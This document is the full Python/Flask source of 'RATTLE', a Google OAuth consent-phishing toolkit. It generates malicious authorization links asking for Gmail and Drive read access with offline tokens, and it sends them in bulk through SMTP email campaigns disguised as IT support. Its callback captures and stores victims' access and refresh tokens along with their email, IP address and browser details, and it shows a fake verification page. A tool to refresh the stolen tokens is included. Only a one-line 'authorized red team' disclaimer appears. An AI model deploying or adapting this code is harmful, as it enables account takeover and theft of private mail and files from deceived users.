#!/usr/bin/env python3
# ============================================
# RATTLE - Google OAuth Phishing Toolkit
# Version: 1.2 - Added SMTP & Email Campaigns
# For authorized red team use only
# ============================================

import os
import json
import secrets
import datetime
import hashlib
import re
import smtplib
import ssl
import threading
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.utils import formataddr
from flask import Flask, render_template, request, jsonify, session, redirect, url_for, send_file
from flask_sqlalchemy import SQLAlchemy
from flask_migrate import Migrate
from werkzeug.security import generate_password_hash, check_password_hash
import requests
from urllib.parse import urlencode
import qrcode
from io import BytesIO
import base64

# ============================================
# Flask App Configuration
# ============================================

app = Flask(__name__)
app.config['SECRET_KEY'] = secrets.token_urlsafe(64)
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///rattle.db'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
app.config['SESSION_COOKIE_SECURE'] = True
app.config['SESSION_COOKIE_HTTPONLY'] = True
app.config['SESSION_COOKIE_SAMESITE'] = 'Lax'

db = SQLAlchemy(app)
migrate = Migrate(app, db)

# ============================================
# Custom Jinja2 Filters
# ============================================

@app.template_filter('json_loads')
def json_loads_filter(data):
    if not data:
        return {}
    try:
        return json.loads(data)
    except:
        return {}

# ============================================
# Database Models
# ============================================

class User(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(80), unique=True, nullable=False)
    password_hash = db.Column(db.String(200), nullable=False)
    created_at = db.Column(db.DateTime, default=datetime.datetime.utcnow)
    is_admin = db.Column(db.Boolean, default=True)
    
    def set_password(self, password):
        self.password_hash = generate_password_hash(password)
    
    def check_password(self, password):
        return check_password_hash(self.password_hash, password)

class Campaign(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    name = db.Column(db.String(100), nullable=False)
    description = db.Column(db.Text)
    status = db.Column(db.String(20), default='active')
    client_id = db.Column(db.String(200), nullable=False)
    client_secret = db.Column(db.String(200), nullable=False)
    redirect_uri = db.Column(db.String(200), default='https://wiskon.shop/callback')
    scopes = db.Column(db.Text, default='openid profile email https://www.googleapis.com/auth/gmail.readonly https://www.googleapis.com/auth/drive.readonly')
    landing_page = db.Column(db.Text, default='default')
    phishing_url = db.Column(db.String(500))
    created_at = db.Column(db.DateTime, default=datetime.datetime.utcnow)
    updated_at = db.Column(db.DateTime, default=datetime.datetime.utcnow, onupdate=datetime.datetime.utcnow)
    
    victims = db.relationship('Victim', backref='campaign', lazy=True)
    tokens = db.relationship('Token', backref='campaign', lazy=True)
    email_campaigns = db.relationship('EmailCampaign', backref='campaign', lazy=True)
    
    def generate_phishing_url(self):
        auth_url = (
            "https://accounts.google.com/o/oauth2/v2/auth?"
            f"client_id={self.client_id}&"
            f"redirect_uri={self.redirect_uri}&"
            "response_type=code&"
            f"scope={' '.join(self.scopes.split())}&"
            "access_type=offline&"
            "prompt=consent"
        )
        self.phishing_url = auth_url
        return auth_url

class Victim(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    campaign_id = db.Column(db.Integer, db.ForeignKey('campaign.id'), nullable=False)
    email = db.Column(db.String(200))
    ip_address = db.Column(db.String(50))
    user_agent = db.Column(db.Text)
    first_seen = db.Column(db.DateTime, default=datetime.datetime.utcnow)
    last_seen = db.Column(db.DateTime, default=datetime.datetime.utcnow)
    status = db.Column(db.String(20), default='pending')
    note = db.Column(db.Text)
    
    tokens = db.relationship('Token', backref='victim', lazy=True)

class Token(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    campaign_id = db.Column(db.Integer, db.ForeignKey('campaign.id'), nullable=False)
    victim_id = db.Column(db.Integer, db.ForeignKey('victim.id'), nullable=False)
    access_token = db.Column(db.Text)
    refresh_token = db.Column(db.Text)
    token_type = db.Column(db.String(50))
    expires_in = db.Column(db.Integer)
    expiry_time = db.Column(db.DateTime)
    scope = db.Column(db.Text)
    user_info = db.Column(db.Text)
    captured_at = db.Column(db.DateTime, default=datetime.datetime.utcnow)
    last_used = db.Column(db.DateTime)
    is_active = db.Column(db.Boolean, default=True)
    
    def to_dict(self):
        user_data = {}
        try:
            if self.user_info:
                user_data = json.loads(self.user_info)
        except:
            pass
        
        return {
            'id': self.id,
            'access_token': self.access_token,
            'refresh_token': self.refresh_token,
            'email': user_data.get('email', 'Unknown'),
            'name': user_data.get('name', 'Unknown'),
            'token_type': self.token_type,
            'expires_in': self.expires_in,
            'scope': self.scope,
            'captured_at': self.captured_at.isoformat(),
            'is_active': self.is_active,
            'user_info': user_data
        }

# ============================================
# NEW: SMTP Configuration Model
# ============================================

class SmtpConfig(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    name = db.Column(db.String(100), default='Default')
    host = db.Column(db.String(200), nullable=False)
    port = db.Column(db.Integer, default=587)
    use_tls = db.Column(db.Boolean, default=True)
    use_ssl = db.Column(db.Boolean, default=False)
    username = db.Column(db.String(200))
    password = db.Column(db.String(200))
    from_email = db.Column(db.String(200), nullable=False)
    from_name = db.Column(db.String(100), default='IT Support')
    is_active = db.Column(db.Boolean, default=True)
    created_at = db.Column(db.DateTime, default=datetime.datetime.utcnow)

# ============================================
# NEW: Email Template Model
# ============================================

class EmailTemplate(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    name = db.Column(db.String(100), nullable=False)
    subject = db.Column(db.String(300), nullable=False)
    body_html = db.Column(db.Text, nullable=False)
    body_text = db.Column(db.Text)
    created_at = db.Column(db.DateTime, default=datetime.datetime.utcnow)

# ============================================
# NEW: Email Campaign Model
# ============================================

class EmailCampaign(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    name = db.Column(db.String(200), nullable=False)
    campaign_id = db.Column(db.Integer, db.ForeignKey('campaign.id'), nullable=False)
    template_id = db.Column(db.Integer, db.ForeignKey('email_template.id'))
    smtp_id = db.Column(db.Integer, db.ForeignKey('smtp_config.id'))
    status = db.Column(db.String(20), default='draft')
    total_targets = db.Column(db.Integer, default=0)
    sent_count = db.Column(db.Integer, default=0)
    failed_count = db.Column(db.Integer, default=0)
    opened_count = db.Column(db.Integer, default=0)
    clicked_count = db.Column(db.Integer, default=0)
    created_at = db.Column(db.DateTime, default=datetime.datetime.utcnow)
    started_at = db.Column(db.DateTime)
    completed_at = db.Column(db.DateTime)
    
    template = db.relationship('EmailTemplate')
    smtp = db.relationship('SmtpConfig')
    targets = db.relationship('EmailTarget', backref='email_campaign', lazy=True, cascade='all, delete-orphan')

# ============================================
# NEW: Email Target Model
# ============================================

class EmailTarget(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    email_campaign_id = db.Column(db.Integer, db.ForeignKey('email_campaign.id'), nullable=False)
    email = db.Column(db.String(300), nullable=False)
    name = db.Column(db.String(200))
    status = db.Column(db.String(20), default='pending')
    sent_at = db.Column(db.DateTime)
    opened_at = db.Column(db.DateTime)
    clicked_at = db.Column(db.DateTime)
    error_message = db.Column(db.Text)
    tracking_id = db.Column(db.String(64), unique=True)
    created_at = db.Column(db.DateTime, default=datetime.datetime.utcnow)

# ============================================
# Create Default Admin User
# ============================================

def create_default_admin():
    with app.app_context():
        if not User.query.filter_by(username='rattle').first():
            admin = User(username='rattle')
            admin.set_password('rattle123')
            db.session.add(admin)
            db.session.commit()
            print("✅ Default admin user created: rattle / rattle123")

# ============================================
# Authentication Routes
# ============================================

@app.route('/')
def index():
    if 'user_id' in session:
        return redirect(url_for('dashboard'))
    return render_template('login.html')

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        user = User.query.filter_by(username=username).first()
        if user and user.check_password(password):
            session['user_id'] = user.id
            return redirect(url_for('dashboard'))
        return render_template('login.html', error='Invalid credentials')
    return render_template('login.html')

@app.route('/logout')
def logout():
    session.pop('user_id', None)
    return redirect(url_for('login'))

# ============================================
# Dashboard Routes
# ============================================

@app.route('/dashboard')
def dashboard():
    if 'user_id' not in session:
        return redirect(url_for('login'))
    
    total_campaigns = Campaign.query.count()
    total_victims = Victim.query.count()
    total_tokens = Token.query.count()
    active_campaigns = Campaign.query.filter_by(status='active').count()
    
    recent_tokens = Token.query.order_by(Token.captured_at.desc()).limit(10).all()
    
    from sqlalchemy import text
    victims_by_day = db.session.query(
        db.func.date(Victim.first_seen).label('date'),
        db.func.count(Victim.id).label('count')
    ).group_by('date').order_by(text('date desc')).limit(7).all()
    
    return render_template('dashboard.html',
        total_campaigns=total_campaigns,
        total_victims=total_victims,
        total_tokens=total_tokens,
        active_campaigns=active_campaigns,
        recent_tokens=recent_tokens,
        victims_by_day=victims_by_day
    )

# ============================================
# Campaign Routes
# ============================================

@app.route('/campaigns')
def campaigns():
    if 'user_id' not in session:
        return redirect(url_for('login'))
    
    all_campaigns = Campaign.query.order_by(Campaign.created_at.desc()).all()
    return render_template('campaigns.html', campaigns=all_campaigns)

@app.route('/campaign/create', methods=['GET', 'POST'])
def create_campaign():
    if 'user_id' not in session:
        return redirect(url_for('login'))
    
    if request.method == 'POST':
        campaign = Campaign(
            name=request.form.get('name'),
            description=request.form.get('description'),
            client_id=request.form.get('client_id'),
            client_secret=request.form.get('client_secret'),
            redirect_uri=request.form.get('redirect_uri', 'https://wiskon.shop/callback'),
            scopes=request.form.get('scopes', 'openid profile email https://www.googleapis.com/auth/gmail.readonly https://www.googleapis.com/auth/drive.readonly')
        )
        campaign.generate_phishing_url()
        db.session.add(campaign)
        db.session.commit()
        return redirect(url_for('campaign_detail', campaign_id=campaign.id))
    
    return render_template('campaign_create.html')

@app.route('/campaign/<int:campaign_id>')
def campaign_detail(campaign_id):
    if 'user_id' not in session:
        return redirect(url_for('login'))
    
    campaign = Campaign.query.get_or_404(campaign_id)
    victims = Victim.query.filter_by(campaign_id=campaign_id).all()
    tokens = Token.query.filter_by(campaign_id=campaign_id).order_by(Token.captured_at.desc()).all()
    
    return render_template('campaign_detail.html',
        campaign=campaign,
        victims=victims,
        tokens=tokens
    )

@app.route('/campaign/<int:campaign_id>/delete', methods=['POST'])
def delete_campaign(campaign_id):
    if 'user_id' not in session:
        return jsonify({'error': 'Unauthorized'}), 401
    
    campaign = Campaign.query.get_or_404(campaign_id)
    db.session.delete(campaign)
    db.session.commit()
    return jsonify({'success': True})

@app.route('/campaign/<int:campaign_id>/generate-qr')
def generate_qr(campaign_id):
    campaign = Campaign.query.get_or_404(campaign_id)
    
    qr = qrcode.QRCode(version=1, box_size=10, border=5)
    qr.add_data(campaign.phishing_url)
    qr.make(fit=True)
    
    img = qr.make_image(fill_color="black", back_color="white")
    buffered = BytesIO()
    img.save(buffered, format="PNG")
    img_str = base64.b64encode(buffered.getvalue()).decode()
    
    return jsonify({'qr_code': img_str})

# ============================================
# Victim Routes
# ============================================

@app.route('/victims')
def victims():
    if 'user_id' not in session:
        return redirect(url_for('login'))
    
    all_victims = Victim.query.order_by(Victim.first_seen.desc()).all()
    return render_template('victims.html', victims=all_victims)

# ============================================
# Token Routes
# ============================================

@app.route('/tokens')
def tokens():
    if 'user_id' not in session:
        return redirect(url_for('login'))
    
    all_tokens = Token.query.order_by(Token.captured_at.desc()).all()
    return render_template('tokens.html', tokens=all_tokens)

@app.route('/api/token/<int:token_id>')
def api_token(token_id):
    if 'user_id' not in session:
        return jsonify({'error': 'Unauthorized'}), 401
    
    token = Token.query.get_or_404(token_id)
    return jsonify(token.to_dict())

@app.route('/token/<int:token_id>/refresh', methods=['POST'])
def refresh_token(token_id):
    if 'user_id' not in session:
        return jsonify({'error': 'Unauthorized'}), 401
    
    token = Token.query.get_or_404(token_id)
    
    if not token.refresh_token:
        return jsonify({'error': 'No refresh token available'}), 400
    
    token_url = "https://oauth2.googleapis.com/token"
    data = {
        "client_id": token.campaign.client_id,
        "client_secret": token.campaign.client_secret,
        "refresh_token": token.refresh_token,
        "grant_type": "refresh_token"
    }
    response = requests.post(token_url, data=data)
    
    if response.status_code == 200:
        new_token = response.json()
        token.access_token = new_token.get('access_token')
        token.expires_in = new_token.get('expires_in')
        token.expiry_time = datetime.datetime.utcnow() + datetime.timedelta(seconds=token.expires_in)
        token.last_used = datetime.datetime.utcnow()
        db.session.commit()
        return jsonify({'success': True, 'access_token': token.access_token[:30] + '...'})
    else:
        return jsonify({'error': 'Refresh failed'}), 400

# ============================================
# NEW: SMTP Routes
# ============================================

@app.route('/smtp')
def smtp_list():
    if 'user_id' not in session:
        return redirect(url_for('login'))
    configs = SmtpConfig.query.all()
    return render_template('smtp_list.html', configs=configs)

@app.route('/smtp/create', methods=['GET', 'POST'])
def smtp_create():
    if 'user_id' not in session:
        return redirect(url_for('login'))
    
    if request.method == 'POST':
        config = SmtpConfig(
            name=request.form.get('name', 'Default'),
            host=request.form.get('host'),
            port=int(request.form.get('port', 587)),
            use_tls=request.form.get('use_tls') == 'on',
            use_ssl=request.form.get('use_ssl') == 'on',
            username=request.form.get('username'),
            password=request.form.get('password'),
            from_email=request.form.get('from_email'),
            from_name=request.form.get('from_name', 'IT Support'),
            is_active=True
        )
        db.session.add(config)
        db.session.commit()
        return redirect(url_for('smtp_list'))
    
    return render_template('smtp_form.html')

@app.route('/smtp/<int:config_id>/test', methods=['POST'])
def smtp_test(config_id):
    config = SmtpConfig.query.get_or_404(config_id)
    
    try:
        msg = MIMEMultipart('alternative')
        msg['Subject'] = 'Rattle SMTP Test'
        msg['From'] = formataddr((config.from_name, config.from_email))
        msg['To'] = config.from_email
        msg.attach(MIMEText('<h1>SMTP Test Successful!</h1><p>Your SMTP configuration is working.</p>', 'html'))
        
        if config.use_ssl:
            context = ssl.create_default_context()
            server = smtplib.SMTP_SSL(config.host, config.port, context=context)
        else:
            server = smtplib.SMTP(config.host, config.port)
            if config.use_tls:
                server.starttls()
        
        if config.username and config.password:
            server.login(config.username, config.password)
        
        server.send_message(msg)
        server.quit()
        return jsonify({'success': True, 'message': 'Test email sent!'})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/smtp/<int:config_id>/delete', methods=['POST'])
def smtp_delete(config_id):
    config = SmtpConfig.query.get_or_404(config_id)
    db.session.delete(config)
    db.session.commit()
    return jsonify({'success': True})

# ============================================
# NEW: Email Template Routes
# ============================================

@app.route('/templates')
def template_list():
    if 'user_id' not in session:
        return redirect(url_for('login'))
    templates = EmailTemplate.query.all()
    return render_template('template_list.html', templates=templates)

@app.route('/template/create', methods=['GET', 'POST'])
def template_create():
    if 'user_id' not in session:
        return redirect(url_for('login'))
    
    if request.method == 'POST':
        template = EmailTemplate(
            name=request.form.get('name'),
            subject=request.form.get('subject'),
            body_html=request.form.get('body_html'),
            body_text=request.form.get('body_text')
        )
        db.session.add(template)
        db.session.commit()
        return redirect(url_for('template_list'))
    
    return render_template('template_form.html')

# ============================================
# NEW: Email Campaign Routes
# ============================================

@app.route('/email-campaigns')
def email_campaigns():
    if 'user_id' not in session:
        return redirect(url_for('login'))
    campaigns = EmailCampaign.query.order_by(EmailCampaign.created_at.desc()).all()
    return render_template('email_campaigns.html', campaigns=campaigns)

@app.route('/email-campaign/create', methods=['GET', 'POST'])
def email_campaign_create():
    if 'user_id' not in session:
        return redirect(url_for('login'))
    
    if request.method == 'POST':
        campaign = EmailCampaign(
            name=request.form.get('name'),
            campaign_id=request.form.get('campaign_id'),
            template_id=request.form.get('template_id') or None,
            smtp_id=request.form.get('smtp_id') or None,
            status='draft'
        )
        db.session.add(campaign)
        db.session.commit()
        
        targets_text = request.form.get('targets', '')
        for line in targets_text.split('\n'):
            line = line.strip()
            if line:
                parts = line.split(',')
                email = parts[0].strip()
                name = parts[1].strip() if len(parts) > 1 else None
                target = EmailTarget(
                    email_campaign_id=campaign.id,
                    email=email,
                    name=name,
                    status='pending'
                )
                db.session.add(target)
        
        db.session.commit()
        campaign.total_targets = len(campaign.targets)
        db.session.commit()
        return redirect(url_for('email_campaign_detail', campaign_id=campaign.id))
    
    campaigns = Campaign.query.filter_by(status='active').all()
    templates = EmailTemplate.query.all()
    smtps = SmtpConfig.query.filter_by(is_active=True).all()
    
    return render_template('email_campaign_form.html',
        campaigns=campaigns,
        templates=templates,
        smtps=smtps
    )

@app.route('/email-campaign/<int:campaign_id>')
def email_campaign_detail(campaign_id):
    if 'user_id' not in session:
        return redirect(url_for('login'))
    campaign = EmailCampaign.query.get_or_404(campaign_id)
    return render_template('email_campaign_detail.html', campaign=campaign)

@app.route('/email-campaign/<int:campaign_id>/send', methods=['POST'])
def email_campaign_send(campaign_id):
    if 'user_id' not in session:
        return jsonify({'error': 'Unauthorized'}), 401
    
    campaign = EmailCampaign.query.get_or_404(campaign_id)
    
    if campaign.status == 'sending':
        return jsonify({'error': 'Campaign is already sending'}), 400
    
    smtp_config = campaign.smtp or SmtpConfig.query.filter_by(is_active=True).first()
    if not smtp_config:
        return jsonify({'error': 'No SMTP configuration found'}), 400
    
    template = campaign.template
    if not template:
        return jsonify({'error': 'No email template found'}), 400
    
    phishing_url = campaign.campaign.phishing_url
    
    campaign.status = 'sending'
    campaign.started_at = datetime.datetime.utcnow()
    db.session.commit()
    
    def send_emails():
        with app.app_context():
            targets = EmailTarget.query.filter_by(
                email_campaign_id=campaign.id,
                status='pending'
            ).all()
            
            for target in targets:
                try:
                    msg = MIMEMultipart('alternative')
                    msg['Subject'] = template.subject
                    msg['From'] = formataddr((smtp_config.from_name, smtp_config.from_email))
                    msg['To'] = formataddr((target.name or target.email, target.email))
                    
                    body_html = template.body_html.replace('{{name}}', target.name or 'User')
                    body_html = body_html.replace('{{email}}', target.email)
                    body_html = body_html.replace('{{link}}', phishing_url)
                    
                    msg.attach(MIMEText(body_html, 'html'))
                    
                    if smtp_config.use_ssl:
                        context = ssl.create_default_context()
                        server = smtplib.SMTP_SSL(smtp_config.host, smtp_config.port, context=context)
                    else:
                        server = smtplib.SMTP(smtp_config.host, smtp_config.port)
                        if smtp_config.use_tls:
                            server.starttls()
                    
                    if smtp_config.username and smtp_config.password:
                        server.login(smtp_config.username, smtp_config.password)
                    
                    server.send_message(msg)
                    server.quit()
                    
                    target.status = 'sent'
                    target.sent_at = datetime.datetime.utcnow()
                    campaign.sent_count += 1
                except Exception as e:
                    target.status = 'failed'
                    target.error_message = str(e)
                    campaign.failed_count += 1
                
                db.session.commit()
            
            campaign.status = 'completed'
            campaign.completed_at = datetime.datetime.utcnow()
            db.session.commit()
    
    thread = threading.Thread(target=send_emails)
    thread.start()
    
    return jsonify({'success': True, 'message': 'Campaign started'})

# ============================================
# Settings Route
# ============================================

@app.route('/settings', methods=['GET', 'POST'])
def settings():
    if 'user_id' not in session:
        return redirect(url_for('login'))
    
    if request.method == 'POST':
        current = request.form.get('current_password')
        new = request.form.get('new_password')
        confirm = request.form.get('confirm_password')
        
        user = User.query.get(session['user_id'])
        
        if not user.check_password(current):
            return render_template('settings.html', error='Current password is incorrect')
        
        if len(new) < 6:
            return render_template('settings.html', error='New password must be at least 6 characters')
        
        if new != confirm:
            return render_template('settings.html', error='Passwords do not match')
        
        user.set_password(new)
        db.session.commit()
        return render_template('settings.html', success='Password updated successfully!')
    
    return render_template('settings.html')

# ============================================
# API Routes
# ============================================

@app.route('/api/campaigns/stats')
def campaign_stats():
    if 'user_id' not in session:
        return jsonify({'error': 'Unauthorized'}), 401
    
    stats = {
        'total_campaigns': Campaign.query.count(),
        'total_victims': Victim.query.count(),
        'total_tokens': Token.query.count(),
        'active_campaigns': Campaign.query.filter_by(status='active').count()
    }
    return jsonify(stats)

# ============================================
# OAuth Callback - Token Capture Endpoint
# ============================================

@app.route('/callback')
def oauth_callback():
    auth_code = request.args.get('code')
    
    if not auth_code:
        return "No authorization code received.", 400
    
    campaign = Campaign.query.filter_by(status='active').first()
    if not campaign:
        return "No active campaign found.", 400
    
    token_url = "https://oauth2.googleapis.com/token"
    data = {
        "code": auth_code,
        "client_id": campaign.client_id,
        "client_secret": campaign.client_secret,
        "redirect_uri": campaign.redirect_uri,
        "grant_type": "authorization_code"
    }
    response = requests.post(token_url, data=data)
    
    if response.status_code != 200:
        return f"Token exchange failed: {response.text}", 400
    
    token_data = response.json()
    
    user_info = {}
    try:
        user_response = requests.get(
            "https://www.googleapis.com/oauth2/v2/userinfo",
            headers={"Authorization": f"Bearer {token_data['access_token']}"}
        )
        if user_response.status_code == 200:
            user_info = user_response.json()
    except:
        pass
    
    victim = Victim(
        campaign_id=campaign.id,
        email=user_info.get('email', 'Unknown'),
        ip_address=request.remote_addr,
        user_agent=request.headers.get('User-Agent'),
        status='authorized'
    )
    db.session.add(victim)
    db.session.commit()
    
    token = Token(
        campaign_id=campaign.id,
        victim_id=victim.id,
        access_token=token_data.get('access_token'),
        refresh_token=token_data.get('refresh_token'),
        token_type=token_data.get('token_type'),
        expires_in=token_data.get('expires_in'),
        scope=token_data.get('scope'),
        user_info=json.dumps(user_info),
        expiry_time=datetime.datetime.utcnow() + datetime.timedelta(seconds=token_data.get('expires_in', 3600))
    )
    db.session.add(token)
    db.session.commit()
    
    print(f"\n[+] 🔑 TOKEN CAPTURED!")
    print(f"[+] Email: {user_info.get('email', 'Unknown')}")
    print(f"[+] Campaign: {campaign.name}")
    print(f"[+] Token ID: {token.id}")
    
    return """
    <html>
    <head>
        <title>Authentication Successful</title>
        <style>
            body { font-family: 'Segoe UI', Arial, sans-serif; text-align: center; padding: 50px; background: #f8f9fa; }
            .container { background: white; padding: 40px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); max-width: 500px; margin: 0 auto; }
            .icon { font-size: 64px; color: #34a853; }
            h2 { color: #202124; margin: 20px 0; }
            p { color: #5f6368; }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="icon">✅</div>
            <h2>Verification Successful</h2>
            <p>You have successfully verified your identity.</p>
            <p style="font-size: 14px; color: #999; margin-top: 20px;">You will be redirected shortly...</p>
            <script>setTimeout(function(){ window.location.href = 'https://www.google.com'; }, 3000);</script>
        </div>
    </body>
    </html>
    """

# ============================================
# Initialize Database
# ============================================

with app.app_context():
    db.create_all()
    create_default_admin()

# ============================================
# Main Entry Point
# ============================================

if __name__ == '__main__':
    print("=" * 60)
    print("🔐 RATTLE - Google OAuth Phishing Toolkit")
    print("=" * 60)
    print("\n✅ Running at: https://wiskon.shop")
    print("🔑 Default login: rattle / rattle123")
    print("\n📊 Dashboard: /dashboard")
    print("📧 Email Campaigns: /email-campaigns")
    print("📧 SMTP Settings: /smtp")
    print("📧 Templates: /templates")
    print("🔑 View tokens: /tokens")
    print("=" * 60)
    print("\n🚀 For production, use:")
    print("   gunicorn -w 4 -b 127.0.0.1:8000 app:app")
    print("=" * 60)
    app.run(debug=False, host='127.0.0.1', port=8000)
